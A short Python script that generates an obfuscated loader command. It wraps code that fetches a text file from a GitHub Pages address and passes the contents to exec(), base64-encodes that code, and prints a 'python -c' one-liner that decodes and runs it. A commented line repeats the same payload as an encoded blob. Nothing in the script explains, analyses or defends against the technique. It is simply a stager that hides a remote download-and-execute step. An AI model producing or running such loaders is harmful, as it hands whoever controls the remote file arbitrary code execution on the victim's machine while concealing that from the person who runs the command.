import base64
code = """import sys, base64
u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',))
r=u.urlopen("https://sl33pypanda.github.io/mi1stRepo/nescesito.txt")
exec(r.read())
"""
script = base64.b64encode(code.encode())

#script = b'aW1wb3J0IHN5cwp1PV9faW1wb3J0X18oJ3VybGxpYicrezI6JycsMzonLnJlcXVlc3QnfVtzeXMudmVyc2lvbl9pbmZvWzBdXSxmcm9tbGlzdD0oJ3VybG9wZW4nLCkpCnI9dS51cmxvcGVuKCJodHRwczovL3NsMzNweXBhbmRhLmdpdGh1Yi5pby9taTFzdFJlcG8vbmVzY2VzaXRvLnR4dCIpCmV4ZWMoci5yZWFkKCkpCg=='




print('python -c "import base64;exec(base64.b64decode(',end='')
print(script,end='')
print( ').decode())"')

